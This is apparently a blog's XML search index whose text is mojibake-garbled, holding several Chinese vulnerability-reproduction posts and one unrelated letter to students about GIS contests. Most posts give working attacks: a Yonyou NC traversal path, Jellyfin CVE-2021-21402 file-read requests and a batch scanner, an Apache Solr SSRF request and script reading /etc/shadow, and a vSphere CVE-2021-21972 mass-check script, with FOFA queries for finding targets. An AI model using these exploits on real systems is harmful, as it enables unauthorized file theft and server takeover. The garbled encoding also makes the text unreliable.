<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[æµåª’ä½“ç®¡ç†æœåŠ¡å™¨å­˜åœ¨å¼±â¼ä»¤æ¼æ´]]></title>
    <url>%2Fposts%2F20730%2F</url>
    <content type="text"><![CDATA[fofaè¯­å¥ï¼š title="æµåª’ä½“ç®¡ç†æœåŠ¡å™¨" ç™»å½•ï¼š document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>å¼±å£ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[â½¤å‹ERP-NC â½¬å½•éå†æ¼æ´]]></title>
    <url>%2Fposts%2F55106%2F</url>
    <content type="text"><![CDATA[æ¼æ´æè¿°â½¤å‹ERP-NC å­˜åœ¨â½¬å½•éå†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡â½¬å½•éå†è·å–æ•æ„Ÿâ½‚ä»¶ä¿¡æ¯ fofaè¯­æ³•app="â½¤å‹-UFIDA-NC" å¤ç°POC: /NCFindWeb?service=IPreAlertConfigService&amp;filename= æŸ¥çœ‹æ–‡ä»¶ï¼ˆè¿™é‡Œä»¥admin.jspä¸ºä¾‹ï¼‰ï¼š document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>â½¤å‹ERP-NC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è‡´å­¦å¼Ÿå­¦å¦¹]]></title>
    <url>%2Fposts%2F33070%2F</url>
    <content type="text"><![CDATA[å„ä½å­¦å¼Ÿå­¦å¦¹å¥½ï¼Œæˆ‘æ˜¯2016çº§åœ°ä¿¡çš„è–›å½­å¸…ã€‚æœ¬æ¥æ˜¯æ‰“ç®—å½•ä¸ªå°è§†é¢‘çš„ï¼Œä½†ç”±äºå·¥ä½œåŸå› æ²¡æœ‰å®ç°ï¼Œç´¢æ€§å°±ç”¨ç®€å•çš„æ–‡å­—æ¥è¡¨è¾¾å§ã€‚ å¬è¯´è€å¸ˆä»¬ç»„ç»‡ä½ ä»¬å¹´è½»ä¸€å±Šçš„å­¦ç”Ÿå‚åŠ è¡Œä¸šå†…çš„å„ç§æ¯”èµ›ï¼Œå¬åˆ°ä¹‹åéå¸¸ç¾¡æ…•ï¼Œéƒ½æœ‰ç‚¹æƒ³å›å»å†ä¸Šä¸€æ¬¡å­¦äº†ğŸ˜†ã€‚ç”±äºæˆ‘ä»¬å½“æ—¶å‚åŠ çš„æ¯”èµ›è¾ƒå°‘ï¼Œå°±å‚åŠ è¿‡ä¸€æ¬¡æ¯”èµ› â€“ ç¬¬ä¸ƒå±Šå…¨å›½å¤§å­¦ç”ŸGISåº”ç”¨æŠ€èƒ½å¤§èµ›ï¼Œè€Œä¸”ä¹Ÿåªæ˜¯æ‹¿äº†ä¸ªäºŒç­‰å¥–ï¼ŒSOæˆ‘çš„ç»éªŒå¯èƒ½ä¹Ÿç›¸å¯¹å…¶ä»–ç«èµ›ç»å†ä¸°å¯Œå­¦é•¿å­¦å§è¾ƒå°‘ä¸€äº›ï¼Œä½†å› ä¸ºæˆ‘ä»¬é‚£ä¸€å±Šä¹‹åå„ç§æ¯”èµ›å’Œæ´»åŠ¨åœ¨å’±ä¸“ä¸šä¹Ÿä¸¾åŠçš„ç«çƒ­èµ·æ¥(å¹´çºªæ¯”è¾ƒå¤§äº†å“ˆå“ˆ)ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå°±ç®€å•åˆ†äº«ä¸€ä¸‹æˆ‘çš„ç»éªŒå§ã€‚ä½ ä»¬è§‰å¾—æœ‰ç”¨çš„éƒ¨åˆ†ï¼Œå¯ä»¥å€Ÿé‰´ä¸€ä¸‹ï¼›è§‰å¾—æ²¡ç”¨çš„éƒ¨åˆ†ï¼Œå°±å½“çœ‹ç™½è¯å°è¯´æ”¾æ¾ä¸€ä¸‹å“ˆ)ã€‚ å‚èµ›å¥½å¤„é¦–å…ˆä¸“ä¸šé¢†åŸŸå†…çš„æ¯”èµ›ï¼Œå¯¹äºä¸ªäººçš„å‘å±•è‚¯å®šæ˜¯æœ‰è¯¸å¤šå¥½å¤„çš„ã€‚é¦–å…ˆä½ å¯ä»¥é€šè¿‡æ¯”èµ›æé«˜è‡ªå·±çš„ä¸“ä¸šç´ å…»ï¼ŒæŒæ¡æ›´å¤šçš„çŸ¥è¯†ï¼›å…¶æ¬¡å¯ä»¥åŸ¹å…»ä½ çš„å›¢é˜Ÿæ„Ÿï¼Œå°½ç®¡å„è‡ªæœ‰å„è‡ªçš„æƒ³æ³•ï¼Œç”šè‡³ä¼šå› ä¸ºæ„è§ä¸åŒè€Œåµèµ·æ¥ï¼Œä½†è¿™æœ€ç»ˆéƒ½æ˜¯ä¸ºäº†åŒä¸€ä¸ªç›®çš„â€“æ¯”èµ›å–å¾—æ›´å¥½çš„ç»“æœï¼Œè¿™åè€Œä¼šæ›´åŠ å¢å¼ºä½ ä»¬çš„å›¢é˜Ÿå‡èšåŠ›ï¼ˆä½†æ˜¯åˆ«çœŸæ‰“èµ·æ¥å“ˆğŸ˜‚ï¼‰ï¼›å†æ¬¡å¤šå‚åŠ æ¯”èµ›å‘¢ï¼Œä½ ä»¬è¿˜èƒ½ç»“è¯†å…¶ä»–é«˜æ ¡å¿—åŒé“åˆçš„æœ‹å‹ï¼Œè¿˜èƒ½è§è¯†åˆ°è¡Œä¸šå†…çš„é¢†å†›äººç‰©(å…‰å¬ç€å°±å¾ˆcoolå‘€)ï¼Œå¯¹ä½ ä»¥åæ·±å…¥è¡Œä¸šæ˜¯ä¸ªä¸å¯å¤šå¾—çš„å®è´µç»å†ã€‚ ç»éªŒåˆ†äº« å¿ƒæ€ã€‚å¿ƒæ€æ˜¯æœ€é‡è¦çš„ï¼Œå¦‚æœå¹³æ—¶ç»ƒä¹ éƒ½ä¸é”™ï¼Œä¸€é“æ¯”èµ›çš„â€œå¤§åœºé¢â€æ…Œäº†ï¼Œé‡åˆ°ç‚¹å°é—®é¢˜å¿ƒæ€å°±å´©äº†ï¼Œæ€ç»ªå°±ä¹±äº†ï¼Œé‚£è¿˜æ€ä¹ˆæ‹¿åæ¬¡ï¼Ÿ å¦‚æœæ˜¯å›¢é˜Ÿå‚åŠ çš„æ¯”èµ›ï¼Œä¸€å®šè¦æ³¨é‡åˆ†å·¥ï¼Œæ‰¾åˆ°æ¯ä¸ªäººæ‰€æ“…é•¿çš„ä¸œè¥¿æ¥åˆ†å·¥æ˜¯ç¬¬ä¸€åŸåˆ™ã€‚åŒæ—¶ä¹Ÿè¦å›¢ç»“åä½œï¼Œä½ ä»¬æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œåªæœ‰ä½ ä»¬ä¸€èµ·æ‰èƒ½å®Œæˆæ¯”èµ›ï¼Œå•é ä¸ªäººå•æ‰“ç‹¬æ–—æ˜¯ä¸è¡Œçš„ã€‚ å¯¹äºGISï¼Œä¸ç®¡æ˜¯ç¼–ç¨‹é¢˜å’Œåˆ¶å›¾é¢˜ï¼Œåªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œä¸‹æ¥å¤šç»ƒï¼ å…¨å›½æœ¬ç§‘ç”Ÿå¤§å¤šæ•°å’Œä½ éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé™¤äº†æä¸ªåˆ«çš„â€œå¤©æ‰â€ï¼ˆè¿™ä¸ªä¸å¾—ä¸æ‰¿è®¤ï¼Œç¡®å®æœ‰å†™äººå¯¹æŸäº›ä¸œè¥¿ç‰¹åˆ«æœ‰ç‰¹é•¿ï¼‰ã€‚å°±è·Ÿå¤§å¤šæ•°äººæ¯”ï¼Œå³ä¾¿ä½ èº«åœ¨æ¸…ååŒ—å¤§ï¼Œä½ ä¸è¯»ä¹¦ï¼Œä½ ä¸Šè¯¾ç¡è§‰ç©æ‰‹æœºè‡ªç”˜å •è½ï¼Œä½ è‚¯å®šä¼šè½åï¼›å“ªæ€•ä½ èº«åœ¨å†ä¸å‡ºåçš„å­¦æ ¡ï¼Œä½ ä»˜å‡ºåŠªåŠ›ï¼Œä¹Ÿä¼šæœ‰æ‰€æˆå°±ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£å°±æ˜¯åŠªåŠ›çš„è¿˜ä¸å¤Ÿï¼Œå¦‚æœä½ ä½¿å‡ºäº†ä¸€è¾ˆå­çš„åŠªåŠ›è¿˜ä¸å¤Ÿï¼Œé‚£å°±ç”¨ä¸‰è¾ˆå­çš„åŠªåŠ›ï¼ä¸€ä¸‡å°æ—¶å®šå¾‹ï¼Œå…ˆå»å°è¯•ä¸€ä¸‹ã€‚ å¤šå»å‚åŠ æœ‰æ„ä¹‰çš„æ¯”èµ›å’Œæ´»åŠ¨å§ï¼Œå°†æ¥ä½ ä¸€å®šä¸ä¼šåæ‚”ã€‚ æœ€åä½ é€‰æ‹©äº†GISï¼Œè¯´æ˜ä½ é€‰æ‹©äº†ä¸€ä¸ªå¾ˆæœ‰å‰æ™¯çš„å­¦ç§‘ï¼Œæ‰€ä»¥ä¸è¦æœ‰ç±»ä¼¼è¿™ç§æŠ±æ€¨çš„è¯è¯­ï¼Œâ€œæˆ‘ä»¬ä¸“ä¸šä»€ä¹ˆéƒ½å­¦ï¼Œå¯æ˜¯ä»€ä¹ˆéƒ½å­¦çš„ä¸ç²¾â€ã€‚å½“ä½ è¿™ä¹ˆæƒ³çš„æ—¶å€™ï¼Œä½ å¯ä»¥æ‰ªå¿ƒè‡ªé—®ï¼Œä½ æ‰€æŠ±æ€¨çš„é‚£é—¨è¯¾ç¨‹æ˜¯è®¤è®¤çœŸçœŸå¬äº†è€å¸ˆè¯¾ä¸Šè®²çš„ä¸œè¥¿äº†å—ï¼Ÿè¯¾ä¸‹è‡ªå·±å»å¤ä¹ å·©å›ºäº†å—ï¼Ÿæ‰€ä»¥ï¼Œæ¯ä¸€é—¨ä¸“ä¸šè¯¾éƒ½è¦å­¦å¥½ï¼Œè¿™æœ‰åŠ©äºä½ åœ¨é¢†åŸŸå†…çš„å‘å±•ï¼Œæ¯ä¸€é—¨å…¬å…±è¯¾ä¹Ÿä¸èƒ½å¿½è§†ï¼Œè¿™æ˜¯ä¸€é—¨æ•™ä¼šä½ ä½œä¸ºä¸€åå¤§å­¦ç”ŸåŸºæœ¬çš„ç´ å…»çš„è¯¾ã€‚è¸è¸å®å®èµ°ä¸‹å»ï¼Œå¤šå»åšï¼Œå°‘ç©ºæƒ³ï¼Œå°±ä¸ä¼šæ„Ÿåˆ°è¿·èŒ«äº†ğŸ’ªã€‚ è€Œä¸”çŸ³å®¶åº„å­¦é™¢çš„GISçœŸçš„æ˜¯ä¸€æ­¥æ­¥çš„åœ¨å˜å¼ºå¤§ï¼Œè¿™ä¸ªç®€å•å›é¡¾ä¸€ä¸‹è¿™çŸ­çŸ­çš„å‡ å¹´å°±èƒ½çœ‹å‡ºï¼Œè¿™ä¹Ÿå¤šäºäº†å’±ä»¬è¿™äº›åœ¨èƒŒåä»˜å‡ºçš„è€å¸ˆä»¬ï¼Œæ˜¯ä»–ä»¬æ’‘èµ·äº†çŸ³å®¶åº„å­¦é™¢GISçš„ä¸€ç‰‡å¤©ã€‚ å¦å¤–å¤§å®¶è¯¾ä¸‹æ—¶é—´å¦‚æœåœ¨è¿½å‰§ï¼ˆåˆ«è¯´ä½ ä¸è¿½å‰§å“¦~ğŸ˜‰ï¼‰çš„è¯ï¼Œå¯ä»¥çœ‹ä¸€çœ‹ã€Šè§‰é†’å¹´ä»£ã€‹è¿™éƒ¨å‰§ï¼Œå¸Œæœ›å®ƒèƒ½ç»™æˆ‘ä»¬è¿™äº›å½“ä»£é’å¹´å­¦å­ä¸€äº›æœ‰æ„ä¹‰çš„ä¸œè¥¿ã€‚ å‹¿å¿˜åˆå¿ƒï¼Œç ¥ç ºå‰è¡Œã€‚åœ¨å‰è¿›çš„è·¯ä¸Šï¼Œè¦ä¿æŒä¸€é¢—åˆå¿ƒå¾ˆéš¾ï¼Œå¸Œæœ›æˆ‘ä»¬éƒ½èƒ½å®ˆæŠ¤æœ€åˆçš„é‚£ä¸ªæ¢¦æƒ³ï¼ é™„ä»¶ä¸‹é¢çš„é“¾æ¥æ˜¯å½“æ—¶å‚åŠ æ¯”èµ›ä¹‹åå†™çš„å‚èµ›ä½“ä¼šï¼šhttp://image.xpshuai.cn/%E8%96%9B%E5%BD%AD%E5%B8%85%E5%8F%82%E8%B5%9B%E4%BD%93%E4%BC%9A.docx document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
  </entry>
  <entry>
    <title><![CDATA[Jellyfinä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¤ç°(CVE-2021-21402)]]></title>
    <url>%2Fposts%2F36974%2F</url>
    <content type="text"><![CDATA[å½±å“ç‰ˆæœ¬ï¼šJellyfin&lt;10.7.1 å¤ç°fofaè¯­æ³•title="Jellyfin" POC# poc_1 GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ Host:xxx.xxx.xxx.xxx Content-Type: application/octet-stream # poc_2 GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1 Host: x.x.x.x:5577 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: */* Referer: http://110.93.247.208:5577/web/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close # poc_3 GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1 Host: xxx.xx.xx.xx.xx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: */* Referer: http://110.93.247.208:5577/web/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close # å…¶ä»–poc GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1 GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1 æ‰¹é‡æ£€æµ‹è„šæœ¬ import requests import os from urllib.parse import quote from requests.sessions import session os.system('') from requests.packages.urllib3.exceptions import InsecureRequestWarning # ç¦ç”¨å®‰å…¨è¯·æ±‚è­¦å‘Š requests.packages.urllib3.disable_warnings(InsecureRequestWarning) import argparse class poc(): def title(self): print(''' +-----------------------------------------------------------------+ æ¼æ´åç§°:CVE-2021-21402 Jellyfinä»»æ„æ–‡ä»¶è¯»å– åŠŸèƒ½ï¼šå•ä¸ªæ£€æµ‹ï¼Œæ‰¹é‡æ£€æµ‹ å•ä¸ªæ£€æµ‹ï¼špython poc.py -u url æ‰¹é‡æ£€æµ‹ï¼špython poc.py -f 1.txt +-----------------------------------------------------------------+ ''') def exp(self, target_url, session): payload=input('è¯·è¾“å…¥ä»»æ„è·¯å¾„,é»˜è®¤è¯·å›è½¦(ä¾‹å¦‚ï¼š..\..\..\..\..\..\..\Windows\win.ini)ï¼š') or '..\..\..\..\..\..\..\Windows\win.ini' url = f"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/" headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'} try: res = session.get(url=url, headers=headers, verify=False, timeout=10) return res except Exception as e: print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e) def poc(self, target_url, session): payload='..\data\jellyfin.db' url = f"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/" headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'} try: res = session.get(url=url, headers=headers, verify=False, timeout=10) return res except Exception as e: print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e) def main(self, target_url, file): self.title() count=0 if target_url: session = requests.session() res=self.exp(target_url, session) if res.status_code==200 and res.text is not None: print(f'æ–‡ä»¶å†…å®¹ï¼š{res.text}') if file: for url in file: count += 1 target_url = url.replace('\n', '') #å–æ¶ˆæ¢è¡Œç¬¦ session = requests.session() res=self.poc(target_url, session) try: if res.status_code==200 and res.text is not None: print(f'\033[31m[{count}] {target_url} å¯èƒ½å­˜åœ¨æ¼æ´\033[0m') else: print(f'[{count}] {target_url} ä¸å­˜åœ¨æ¼æ´') except Exception as e: print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e) if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument('-u', '--url', type=str, default=False, help="ç›®æ ‡åœ°å€ï¼Œå¸¦ä¸Šhttp://") parser.add_argument("-f", '--file', type=argparse.FileType('r'), default=False, help="æ‰¹é‡æ£€æµ‹ï¼Œå¸¦ä¸Šhttp://") args = parser.parse_args() run = poc() run.main(args.url, args.file) ä¿®å¤å»ºè®®ï¼š æ›´æ–°ç‰ˆæœ¬ã€‚ åœ¨Webåº”ç”¨é˜²ç«å¢™ä¸Šæ·»åŠ é˜²æŠ¤è§„åˆ™ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>Jellyfin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache Solr SSRFä¸ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´]]></title>
    <url>%2Fposts%2F7700%2F</url>
    <content type="text"><![CDATA[å‰è¨€Apache Solræ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡ï¼Œä½¿ç”¨Javaè¯­è¨€å¼€å‘ï¼ŒåŸºäºLuceneçš„å…¨æ–‡æœç´¢æœåŠ¡å™¨ã€‚ Apache Solrå…¨ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªSSRFä¸ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå› Apache Solræ•´ä½“é»˜è®¤å®‰è£…ä¸ºæœªæˆæƒï¼Œä¸”å¤§éƒ¨åˆ†èµ„äº§éƒ½ä¸ºæœªæˆæƒï¼Œæä¾›ä¼—å¤šapiæ¥å£ï¼Œæ”¯æŒæœªæˆæƒç”¨æˆ·é€šè¿‡config apiæ›´æ”¹é…ç½®æ–‡ä»¶ï¼Œæ”»å‡»é¢è¾ƒå¤§ã€‚å»ºè®®ç›¸å…³ç”¨æˆ·åŠæ—¶é‡‡å–æªæ–½é˜»æ­¢æ”»å‡»ã€‚ å½±å“èŒƒå›´Apache Solr æ‰€æœ‰ç‰ˆæœ¬ æ¼æ´å¤ç°fofaæŸ¥è¯¢èµ„äº§å…³é”®å­—ï¼š app="APACHE-Solr" 1.é¦–å…ˆè®¿é—®ç›®æ ‡urlæ‹¼æ¥ä¸‹é¢çš„è·¯å¾„ï¼Œè·å–å®ä¾‹å¯¹è±¡çš„åç§° /solr/admin/cores?indexInfo=false&amp;wt=json å¦‚å›¾ï¼Œå¯ä»¥å¾—åˆ°å®ä¾‹å¯¹è±¡çš„åç§°ä¸ºTourist-guide-Server 2.æ„é€ è·¯å¾„ /solr/".iii."/debug/dump?param=ContentStreams&amp;wt=json å…¶ä¸­iiiå°±æ˜¯æˆ‘ä»¬å‰é¢å¾—åˆ°çš„å®ä¾‹å¯¹è±¡çš„åç§°è¿™é‡Œï¼Œæˆ‘ä»¬æ„é€ ä¹‹åä¸ºä¸‹é¢è¿™ä¸ª(è¿™ä¸ªåœ°å€ä½œä¸ºpostè¯·æ±‚çš„åœ°å€)ï¼š /solr/Tourist-guide-Server/debug/dump?param=ContentStreams&amp;wt=json è€Œpostæ•°æ®ä¸­çš„bodyçš„å†…å®¹ä¸ºï¼šstream.url=file:///etc/passwd å³(å‘é€è¿™ä¸ªæ•°æ®åŒ…)ï¼š POST /solr/Tourist-guide-Server/debug/dump?param=ContentStreams&amp;wt=json HTTP/1.1 Host: IP:PORT Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 29 stream.url=file:///etc/shadow æ¼æ´åˆ†æç•¥ EXP#!/usr/bin/env python3 # -*- coding:utf-8 -*- import requests import json import urllib import time import re def Getins(url): try: ins="" url = url+"solr/admin/cores?indexInfo=false&amp;wt=json" response = requests.get(url=url) data = str(response.text) ins = re.findall(r'\"name\":\"(.+?)\",',data)[0] return(ins) except IndexError: return("") def Getfile(url,ins,filename): try: url = url+"solr/"+ins+"/debug/dump?param=ContentStreams&amp;wt=json" headers ={ 'Content-Type': 'application/x-www-form-urlencoded' } payload = str("stream.url=file://"+filename) response = requests.post(url=url,headers=headers,data=payload) data = str(response.text) test = re.findall(r'\"stream\":\"(.+?)\"\}]',data)[0] print(test.replace(r"\n","\n")) except IndexError: print("ä¸èƒ½è¯»å–æ­¤æ–‡ä»¶") if __name__ == '__main__': url = input("è¯·è¾“å…¥æµ‹è¯•åœ°å€:") filename = input("è¯·è¾“å…¥è¯»å–çš„æ–‡ä»¶è·¯å¾„:") ins=Getins(url) if(ins == ""): print("ä¸å­˜åœ¨æ¼æ´") else: Getfile(url,ins,filename) è¯»å–æ•ˆæœï¼š document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>Solr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2021-21972 vSphere Client RCEå¤ç°]]></title>
    <url>%2Fposts%2F58955%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹vSphere æ˜¯ VMware æ¨å‡ºçš„è™šæ‹ŸåŒ–å¹³å°å¥—ä»¶ï¼ŒåŒ…å« ESXiã€vCenter Server ç­‰ä¸€ç³»åˆ—çš„è½¯ä»¶ã€‚å…¶ä¸­ vCenter Server ä¸º ESXi çš„æ§åˆ¶ä¸­å¿ƒï¼Œå¯ä»å•ä¸€æ§åˆ¶ç‚¹ç»Ÿä¸€ç®¡ç†æ•°æ®ä¸­å¿ƒçš„æ‰€æœ‰ vSphere ä¸»æœºå’Œè™šæ‹Ÿæœºã€‚ vSphere Clientï¼ˆHTML5ï¼‰ åœ¨ vCenter Server æ’ä»¶ä¸­å­˜åœ¨ä¸€ä¸ªè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ã€‚æœªæˆæƒçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡å¼€æ”¾ 443 ç«¯å£çš„æœåŠ¡å™¨å‘ vCenter Server å‘é€ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œå†™å…¥webshellï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚ å½±å“èŒƒå›´ vmware:vcenter_server 7.0 U1c ä¹‹å‰çš„ 7.0 ç‰ˆæœ¬ vmware:vcenter_server 6.7 U3l ä¹‹å‰çš„ 6.7 ç‰ˆæœ¬ vmware:vcenter_server 6.5 U3n ä¹‹å‰çš„ 6.5 ç‰ˆæœ¬ æ¼æ´åˆ†ææˆ‘å¤ªèœäº†ï¼Œè¿˜æ˜¯æ¬è¿ä¸€ä¸‹å¤§ä½¬çš„åˆ†æå§ï¼š http://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi â€¦æ­¤å¤„çœç•¥ä¸€ä¸‡å­—â€¦ ç›´æ¥å°†tarè§£å‹çš„æ–‡ä»¶åä¸/tmp/unicorn_ova_diræ‹¼æ¥å¹¶å†™å…¥æ–‡ä»¶ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨../ç»•è¿‡ç›®å½•é™åˆ¶ã€‚ è‹¥ç›®æ ‡ä¸ºLinuxç¯å¢ƒï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º../../home/vsphere-ui/.ssh/authorized_keysçš„taræ–‡ä»¶ï¼Œä¸Šä¼ åå³å¯ä½¿ç”¨SSHè¿æ¥æœåŠ¡å™¨ã€‚ POC https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py è¯¥pocä¸»è¦å°±æ˜¯é€šè¿‡ä»¥ä¸‹è·¯å¾„æ¥è¿›è¡Œåˆ¤æ–­, å¦‚æœè¿”å›405åˆ™è¡¨ç¤ºè¯¥æ¼æ´å­˜åœ¨ï¼š /ui/vropspluginui/rest/services/uploadova POCä»£ç å¦‚ä¸‹ï¼š #!/usr/bin/python3 # -*- coding=utf-8 -*- #-*- coding:utf-8 -*- banner = """ 888888ba dP 88 `8b 88 a88aaaa8P' .d8888b. d8888P .d8888b. dP dP 88 `8b. 88' `88 88 Y8ooooo. 88 88 88 .88 88. .88 88 88 88. .88 88888888P `88888P8 dP `88888P' `88888P' ooooooooooooooooooooooooooooooooooooooooooooooooooooo @time:2021/02/24 CVE-2021-21972.py C0de by NebulabdSec - @batsu """ print(banner) import threadpool import random import requests import argparse import http.client import urllib3 import socket import socks socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1080) socket.socket = socks.socksocket urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) http.client.HTTPConnection._http_vsn = 10 http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0' TARGET_URI = "/ui/vropspluginui/rest/services/uploadova" def get_ua(): first_num = random.randint(55, 62) third_num = random.randint(0, 3200) fourth_num = random.randint(0, 140) os_type = [ '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)', '(X11; Linux x86_64)', '(Macintosh; Intel Mac OS X 10_12_6)' ] chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num) ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36', '(KHTML, like Gecko)', chrome_version, 'Safari/537.36'] ) return ua def CVE_2021_21972(url): # proxies = {"scoks5": "http://127.0.0.1:1080"} headers = { 'User-Agent': get_ua(), "Content-Type": "application/x-www-form-urlencoded" } targetUrl = url + TARGET_URI try: res = requests.get(targetUrl, headers=headers, timeout=15, verify=False) # proxies=proxies) # proxies={'socks5': 'http://127.0.0.1:1081'}) # print(len(res.text)) if res.status_code == 405: print("[+] URL:{}--------å­˜åœ¨CVE-2021-21972æ¼æ´".format(url)) # print("[+] Command success result: " + res.text + "\n") with open("å­˜åœ¨vmwareæ¼æ´åœ°å€.txt", 'a+') as fw: fw.write(url + '\n') else: print("[-] " + url + " æ²¡æœ‰å‘ç°CVE-2021-21972æ¼æ´.\n") # except Exception as e: # print(e) except: print("[-] " + url + " Request ERROR.\n") def multithreading(filename, pools=5): works = [] with open(filename, "r") as f: for i in f: func_params = [i.rstrip("\n")] # func_params = [i] + [cmd] works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(CVE_2021_21972, works) [pool.putRequest(req) for req in reqs] pool.wait() def main(): parser = argparse.ArgumentParser() parser.add_argument("-u", "--url", help="Target URL; Example:http://ip:port") parser.add_argument("-f", "--file", help="Url File; Example:url.txt") # parser.add_argument("-c", "--cmd", help="Commands to be executed; ") args = parser.parse_args() url = args.url # cmd = args.cmd file_path = args.file if url != None and file_path ==None: CVE_2021_21972(url) elif url == None and file_path != None: multithreading(file_path, 10) # é»˜è®¤15çº¿ç¨‹ if __name__ == "__main__": main() EXP https://blog.csdn.net/weixin_43650289/article/details/114055417 import tarfile 